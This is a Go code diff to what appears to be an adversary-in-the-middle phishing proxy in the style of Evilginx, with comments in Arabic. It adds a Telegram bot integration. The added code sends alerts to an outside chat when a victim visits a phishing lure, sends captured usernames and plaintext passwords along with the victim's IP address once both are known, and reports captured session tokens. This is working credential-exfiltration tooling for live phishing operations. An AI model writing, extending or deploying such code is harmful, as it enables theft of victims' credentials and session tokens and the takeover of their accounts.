@@ -70,6 +70,7 @@ type HttpProxy struct {
 	db                *database.Database
 	bl                *Blacklist
 	gophish           *GoPhish
+	telegram          *TelegramBot
 	sniListener       net.Listener
 	isRunning         bool
 	sessions          map[string]*Session
@@ -122,6 +123,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		ip_sids:           make(map[string]string),
 		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript"},
 	}
+	
+	// استخدام إعدادات التليجرام من الملف الجديد
+	botToken, chatID := GetTelegramConfig(cfg.GetTelegramBotToken(), cfg.GetTelegramChatID())
+	p.telegram = NewTelegramBot(botToken, chatID)
 
 	p.Server = &http.Server{
 		Addr:         fmt.Sprintf("%s:%d", hostname, port),
@@ -401,6 +406,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									log.Info("[%d] [%s] landing URL: %s", sid, hiblue.Sprint(pl_name), req_url)
 									p.sessions[session.Id] = session
 									p.sids[session.Id] = sid
+									
+									// إرسال إشعار تليجرام بزيارة جديدة
+									go p.telegram.NotifyNewVisit(session.Id, pl_name, remote_addr, req.Header.Get("User-Agent"))
 
 									if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
 										rid, ok := session.Params["rid"]
@@ -1664,6 +1672,11 @@ func (p *HttpProxy) setSessionUsername(sid string, username string) {
 	s, ok := p.sessions[sid]
 	if ok {
 		s.SetUsername(username)
+		
+		// إذا كان كل من اسم المستخدم وكلمة المرور متوفرين، أرسل إشعارًا
+		if s.Username != "" && s.Password != "" {
+			go p.telegram.NotifyCredentialsCaptured(sid, s.Name, s.Username, s.Password, s.RemoteAddr)
+		}
 	}
 }
 
@@ -1674,6 +1687,11 @@ func (p *HttpProxy) setSessionPassword(sid string, password string) {
 	s, ok := p.sessions[sid]
 	if ok {
 		s.SetPassword(password)
+		
+		// إذا كان كل من اسم المستخدم وكلمة المرور متوفرين، أرسل إشعارًا
+		if s.Username != "" && s.Password != "" {
+			go p.telegram.NotifyCredentialsCaptured(sid, s.Name, s.Username, s.Password, s.RemoteAddr)
+		}
 	}
 }
 
@@ -2075,4 +2093,18 @@ func getSessionCookieName(pl_name string, cookie_name string) string {
 	s_hash := fmt.Sprintf("%x", hash[:4])
 	s_hash = s_hash[:4] + "-" + s_hash[4:]
 	return s_hash
+}
+
+func (p *HttpProxy) notifyTokensCaptured(sid string) {
+	// التحقق من وجود الجلسة
+	s, ok := p.sessions[sid]
+	if !ok {
+		return
+	}
+
+	// التحقق من أن تليجرام مفعل
+	if p.telegram != nil && p.telegram.Enabled {
+		// إرسال إشعار بالتقاط الرموز
+		go p.telegram.NotifyTokensCaptured(sid, s.Name, s.RemoteAddr)
+	}
 }
